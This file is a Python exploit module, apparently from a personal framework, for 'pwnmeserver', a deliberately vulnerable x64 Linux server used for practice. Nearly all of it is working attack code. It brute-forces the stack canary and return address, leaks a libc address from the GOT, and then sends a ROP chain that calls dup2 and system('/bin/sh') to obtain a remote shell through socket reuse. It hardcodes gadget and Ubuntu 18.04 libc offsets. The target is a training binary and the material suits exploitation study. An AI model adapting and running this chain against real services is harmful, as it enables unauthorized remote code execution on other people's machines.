# ---------------------------------------------------------------------------------------------------- #
# Exploit for pwnmeserver V1.0.0.0 buffer overflow x64                                                 #
# compiled on Ubuntu 18.04 with Canary and DEP/NX + ASLR and PIE                                       #
# Tested on Ubuntu 18.04 + libc.so.6 2.2.5                                                             #
# The exploit work in 4 stages:                                                                        #
# 1) Brute-forcing canary with byte by byte overwriting                                                #
# 2) Brute-forcing a valid return address of the program using byte by byte overwriting                #
# 3) Deducing the program address space base value by leaking the address of write@libc from GOT       #
# 4) Sending final exploit to get a shell with socket reuse                                            #
#                                                                                                      #
# Used techniques: Canary bruteforcing, ASLR bruteforcing, information leakage,                        #
#                  ROP, ret2plt and ret2libc                                                           #
# ---------------------------------------------------------------------------------------------------- #

# --------------------------------------- Loading packages... ---------------------------------------- #
import typing
import socket
import pathlib
import struct
from pytoolcore import exception
from core import exploitcore
from pwncore import rop, process, pwnutils

# ---------------------------------------------------------------------------------------------------- #


# -------------------------------- pwnmeserver child process stub ------------------------------------ #

class Pwnmeserverx64(process.RemoteProcess):
    RECVSIZE: int = 65535
    TIMEOUT: int = 2

    def __init__(self, rsockaddr: typing.Tuple[typing.Any, ...]) -> None:
        super(Pwnmeserverx64, self).__init__(rsockaddr, pwnutils.X64(), Pwnmeserverx64.TIMEOUT)

    def connect(self) -> None:
        super(Pwnmeserverx64, self).connect()
        try:
            self.recv(Pwnmeserverx64.RECVSIZE)
        except(socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            self.disconnect()
            raise (exception.ErrorException(str(err)))

    def ready(self) -> None:
        pass

    def alive(self) -> bool:
        res: bool = False
        try:
            if self.recv(Pwnmeserverx64.RECVSIZE, Pwnmeserverx64.TIMEOUT) == b"Try harder :)\n":
                res = True
        except socket.timeout:
            pass
        return res

# ---------------------------------------------------------------------------------------------------- #


class Linux64PwnmeserverExploit(exploitcore.Exploit):
    AUTHOR: str = "Danakane"
    EXPLOITREF: str = "pwnmeserver_x64"
    CANARYOFFSET: int = 264
    RIPOFFSET: int = 8
    SAVEFILE: str = str(pathlib.Path(__file__).resolve().parent) + "/.save/pwnmeserver.sav"
    SOCKETFD: int = 0x4

    RETADDRESSES: typing.List[int] = [
        0xf1c,  # legit return address of check function
    ]

    PLT: typing.Dict[str, int] = {
        "write@plt": 0x970,  # used to read memory
        "strcmp@plt": 0x9e0,  # used to control indirectly rdx instead of pop rdx ret => set to rdx to 6
        "exit@plt": 0xa50  # used to gracefully exit after exploitation
    }

    GOT: typing.Dict[str, int] = {
        "write@got": 0x201f40
    }

    GADGETS: typing.Dict[str, typing.List[int]] = {
        "pop_rdi_ret": [0x10b3, "pop rdi; ret;", 1],
        "pop_rsi_pop_r15_ret": [0x10b1, "pop rsi; pop r15; ret;", 2],
        "ret": [0x956, "ret;", 0]  # for 16-bytes alignment upon calling system@libc
    }

    LIBC: typing.Dict[str, typing.Dict[str, int]] = {
        "'Ubuntu 18.04 LTS x64'": {
            "write@libc": 0x110140,
            "dup2@libc": 0x1109a0,
            "system@libc": 0x4f440,
            "binsh@libc": 0x1b3e9a
        }
    }

    TARGETS: typing.List[str] = [target for target in LIBC.keys()]

    def __init__(self) -> None:
        compatibleploads: typing.List[str] = []  # No compatibles payloads: it's a socket reuse
        super(Linux64PwnmeserverExploit, self).__init__()
        self.customize(Linux64PwnmeserverExploit.AUTHOR, Linux64PwnmeserverExploit.EXPLOITREF,
                       compatibleploads, Linux64PwnmeserverExploit.TARGETS)
        self.__pwnmeserver__: Pwnmeserverx64 = None
        self.__canary__: int = 0x0
        self.__pwnmeserverbase__: int = 0x0
        self.__libcbase__: int = 0x0
        self.__rop__: rop.ROP = rop.ROP()

        self.__canaryfound__: bool = False
        self.__pwnmeserverbasefound__: bool = False
        self.__libcbasefound__: bool = False

    def initgagdets(self, base: int) -> None:
        self.__rop__.clear(base)
        for gadgetname, [addr, comment, nbparameters] in Linux64PwnmeserverExploit.GADGETS.items():
            self.__rop__.register(gadgetname=gadgetname, gadgetaddr=addr,
                                  nbparameters=nbparameters, gadgetcomments=comment)

    def leak(self) -> int:
        self.initgagdets(self.__pwnmeserverbase__)
        trash: bytes = b"A" * Linux64PwnmeserverExploit.CANARYOFFSET
        junk: bytes = b"A" * Linux64PwnmeserverExploit.RIPOFFSET
        self.__pwnmeserver__.connect()
        i: int = 0
        while i < 8:
            # call strcmp to set rdx to 0x6
            self.__rop__.packgadget("pop_rdi_ret",
                                    self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.GOT["write@got"])
            self.__rop__.packgadget("pop_rsi_pop_r15_ret",
                                    self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.GOT["write@got"],
                                    self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.GOT["write@got"])
            self.__rop__.pack(self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.PLT["strcmp@plt"])
            # call write
            self.__rop__.packgadget("pop_rdi_ret", Linux64PwnmeserverExploit.SOCKETFD)
            self.__rop__.packgadget("pop_rsi_pop_r15_ret",
                                    self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.GOT["write@got"] + i,
                                    self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.GOT["write@got"])
            self.__rop__.pack(self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.PLT["write@plt"])
            i += 6
        self.__pwnmeserver__.send(trash + struct.pack(pwnutils.X64().littleendian, self.__canary__) +
                                  junk + self.__rop__.raw)
        res: bytes = b""
        while len(res) < 8:
            res += self.__pwnmeserver__.recv(Pwnmeserverx64.RECVSIZE)
        writelibc: int = struct.unpack(pwnutils.X64().littleendian, res[:8])[0]
        return writelibc

    def pwn(self) -> None:
        self.initgagdets(self.__pwnmeserverbase__)
        trash: bytes = b"A" * Linux64PwnmeserverExploit.CANARYOFFSET
        junk: bytes = b"A" * Linux64PwnmeserverExploit.RIPOFFSET
        self.__pwnmeserver__.connect()
        for i in range(3):
            # call dup2 to duplicate socket on file descriptor i
            self.__rop__.packgadget("pop_rdi_ret", Linux64PwnmeserverExploit.SOCKETFD)
            self.__rop__.packgadget("pop_rsi_pop_r15_ret", i,
                                    self.__libcbase__ + Linux64PwnmeserverExploit.LIBC[self.target]["binsh@libc"])
            self.__rop__.pack(self.__libcbase__ + Linux64PwnmeserverExploit.LIBC[self.target]["dup2@libc"])
        self.__rop__.packgadget("ret")
        self.__rop__.packgadget("pop_rdi_ret", self.__libcbase__ +
                                Linux64PwnmeserverExploit.LIBC[self.target]["binsh@libc"])
        self.__rop__.pack(self.__libcbase__ + Linux64PwnmeserverExploit.LIBC[self.target]["system@libc"])
        self.__rop__.packgadget("pop_rdi_ret", 0x0)
        self.__rop__.pack(self.__pwnmeserverbase__ + Linux64PwnmeserverExploit.PLT["exit@plt"])
        print("Exploit's ROP chain: ")
        print(self.__rop__.dump())
        self.__pwnmeserver__.send(trash + struct.pack(pwnutils.X64().littleendian, self.__canary__) +
                                  junk + self.__rop__.raw)

    def save(self) -> None:
        file = open(Linux64PwnmeserverExploit.SAVEFILE, "w", 1)
        if self.__canaryfound__:
            file.write("canary=" + str(self.__canary__) + "\n")
        if self.__pwnmeserverbasefound__:
            file.write("pwnmeserverbase=" + str(self.__pwnmeserverbase__) + "\n")
        if self.__libcbasefound__:
            file.write("libcbase=" + str(self.__libcbase__) + "\n")
        file.close()

    def load(self) -> None:
        file = open(Linux64PwnmeserverExploit.SAVEFILE, "r", 1)
        linebuf: str = file.readline()
        while linebuf:
            if linebuf != "\n":
                field: str = linebuf.split("=")[0]
                value: int = int(linebuf.split("=")[1])
                if field == "canary":
                    self.__canaryfound__ = True
                    self.__canary__ = value
                elif field == "libcbase":
                    self.__libcbasefound__ = True
                    self.__libcbase__ = value
                elif field == "pwnmeserverbase":
                    self.__pwnmeserverbasefound__ = True
                    self.__pwnmeserverbase__ = value
            linebuf = file.readline()

    def run(self, rsockaddr: typing.Tuple[typing.Any, ...]) -> typing.Any:
        self.__pwnmeserver__ = Pwnmeserverx64(rsockaddr)
        self.load()
        # 1st step : bruteforce the canary
        if not self.__canaryfound__:
            self.__canary__ = self.__pwnmeserver__.bruteforcecanary(Linux64PwnmeserverExploit.CANARYOFFSET, True)
            self.__canaryfound__ = True
            self.save()
        print("canary value: " + hex(self.__canary__))
        # 2nd step : bruteforce the rip register value
        if self.__canaryfound__ and not self.__pwnmeserverbasefound__:
            rip: int = self.__pwnmeserver__.bruteforcememory(b"\x41" * Linux64PwnmeserverExploit.CANARYOFFSET +
                                                             struct.pack(pwnutils.X64().littleendian, self.__canary__),
                                                             2, True)[1]
            self.__pwnmeserverbase__ = rip - Linux64PwnmeserverExploit.RETADDRESSES[0]
            self.__pwnmeserverbasefound__ = True
            self.save()
        print("pwnmeserver base address: " + hex(self.__pwnmeserverbase__))
        # 3rd step : leak write@libc address from GOT table
        if self.__canaryfound__ and self.__pwnmeserverbasefound__ and not self.__libcbasefound__:
            writelibc: int = self.leak()
            self.__libcbase__ = writelibc - Linux64PwnmeserverExploit.LIBC[self.target]["write@libc"]
            self.__libcbasefound__ = True
            self.save()
        print("libc base address: " + hex(self.__libcbase__))
        # 4th step : build final exploit and pwn
        if self.__canaryfound__ and self.__pwnmeserverbasefound__ and self.__libcbasefound__:
            self.pwn()
        return self.__pwnmeserver__.skt


blueprint: typing.Callable = Linux64PwnmeserverExploit
name: str = Linux64PwnmeserverExploit.EXPLOITREF

# load pwnmeserver_x64
# pwn scripter linux_displaypwnedmsgbox rhost 192.168.56.101 rport 1025

# ---------------------------------------------------------------------------------------------------- #
